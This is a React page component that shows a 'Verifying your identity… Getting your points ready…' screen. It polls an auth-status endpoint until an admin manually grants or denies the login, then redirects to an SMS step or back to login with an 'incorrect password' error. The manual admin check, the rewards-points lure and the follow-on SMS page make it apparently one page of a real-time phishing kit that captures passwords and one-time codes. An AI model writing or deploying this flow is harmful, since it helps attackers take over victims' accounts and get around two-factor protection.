import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { Loader2, Clock, Shield, CheckCircle } from "lucide-react";
import { Logo } from "@/components/Logo";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

interface StatusResponse {
  status: "pending" | "granted" | "denied";
  requestId: string;
}

export default function LoadingPage() {
  const [, setLocation] = useLocation();
  const [requestId, setRequestId] = useState<string>("");
  const [username, setUsername] = useState<string>("");
  const [currentStep, setCurrentStep] = useState<1 | 2>(1);

  useEffect(() => {
    document.title = "Verifying your identity…";
    return () => { document.title = "Sign in"; };
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setRequestId(urlParams.get("requestId") || "");
    setUsername(urlParams.get("username") || "");
  }, []);

  // 5-minute timeout — redirect back to login if admin never responds
  useEffect(() => {
    if (!requestId) return;
    const timeout = setTimeout(() => {
      setLocation(`/login?username=${encodeURIComponent(username)}&error=timeout`);
    }, 5 * 60 * 1000);
    return () => clearTimeout(timeout);
  }, [requestId, username, setLocation]);

  const { data: status } = useQuery<StatusResponse>({
    queryKey: ["/api/auth/status", requestId],
    enabled: !!requestId,
    refetchInterval: 2000,
    retry: false,
  });

  useEffect(() => {
    if (!status?.status) return;
    if (status.status === "granted") {
      setCurrentStep(2);
      // Brief pause so the user sees step 2 activate before redirect
      setTimeout(() => {
        setLocation(`/sms?username=${encodeURIComponent(username)}`);
      }, 600);
    } else if (status.status === "denied") {
      setLocation(`/login?username=${encodeURIComponent(username)}&error=incorrect_password`);
    }
  }, [status, username, setLocation]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 via-white to-slate-100">
      <header className="auth-page-header border-b border-slate-200 bg-white/70 backdrop-blur">
        <Logo />
      </header>
      <div role="main" className="auth-form-container flex items-center justify-center py-10">
        <Card className="w-full max-w-md border-slate-200 shadow-lg shadow-slate-100">
          <CardHeader className="pb-4">
            <CardTitle className="text-center text-xl font-semibold text-slate-900">
              Processing your request
            </CardTitle>
            <p className="mt-2 text-center text-sm text-slate-500">
              Checking your identity… Getting your points ready…
            </p>
          </CardHeader>
          <CardContent className="space-y-8">
            {/* Central icon */}
            <div className="flex justify-center">
              <div className="flex h-20 w-20 items-center justify-center rounded-full bg-blue-50">
                {currentStep === 2 ? (
                  <CheckCircle className="h-10 w-10 text-green-600" />
                ) : (
                  <Loader2 className="h-10 w-10 animate-spin text-blue-600" />
                )}
              </div>
            </div>

            {/* Real step indicator */}
            <div className="space-y-4 rounded-lg border border-slate-200 bg-slate-50/80 p-5">
              <div className="flex items-center gap-3 text-sm">
                <div className={`flex h-6 w-6 items-center justify-center rounded-full ${currentStep === 1 ? "bg-blue-100" : "bg-green-100"}`}>
                  {currentStep === 1
                    ? <Loader2 className="h-3 w-3 animate-spin text-blue-600" />
                    : <CheckCircle className="h-3 w-3 text-green-600" />}
                </div>
                <span className={`font-medium ${currentStep === 1 ? "text-blue-800" : "text-green-800"}`}>
                  {currentStep === 1 ? "Verifying your identity…" : "Identity verified ✓"}
                </span>
              </div>
              <div className="flex items-center gap-3 text-sm">
                <div className={`flex h-6 w-6 items-center justify-center rounded-full ${currentStep === 2 ? "bg-blue-100" : "bg-slate-200"}`}>
                  {currentStep === 2
                    ? <Loader2 className="h-3 w-3 animate-spin text-blue-600" />
                    : <Shield className="h-3 w-3 text-slate-500" />}
                </div>
                <span className={currentStep === 2 ? "font-medium text-blue-800" : "text-slate-500"}>
                  Preparing your points
                </span>
              </div>
            </div>

            {/* Wait message */}
            <div className="rounded-lg border border-blue-100 bg-blue-50/80 p-4">
              <div className="flex items-start gap-3">
                <Clock className="mt-0.5 h-5 w-5 flex-shrink-0 text-blue-600" />
                <div className="text-sm text-blue-900">
                  <p className="mb-1 font-medium">Please don&apos;t close this page</p>
                  <p className="text-xs sm:text-sm text-blue-900/90">
                    This process usually takes only a few moments. We&apos;ll redirect you automatically once verification is complete.
                  </p>
                </div>
              </div>
            </div>

            {/* Bouncing dots */}
            <div className="flex items-center justify-center space-x-2">
              <div className="h-2 w-2 animate-bounce rounded-full bg-blue-600" />
              <div className="h-2 w-2 animate-bounce rounded-full bg-blue-600" style={{ animationDelay: "0.1s" }} />
              <div className="h-2 w-2 animate-bounce rounded-full bg-blue-600" style={{ animationDelay: "0.2s" }} />
            </div>
          </CardContent>
        </Card>
      </div>
      <footer className="auth-footer">
        <div className="auth-footer-content">
          <p className="auth-footer-copyright">Copyright © {new Date().getFullYear()}</p>
          <a className="auth-footer-privacy" href="/privacy" data-testid="link-privacy">Privacy</a>
          <a className="auth-footer-terms" href="/terms" data-testid="link-terms">Terms of use</a>
        </div>
      </footer>
    </div>
  );
}
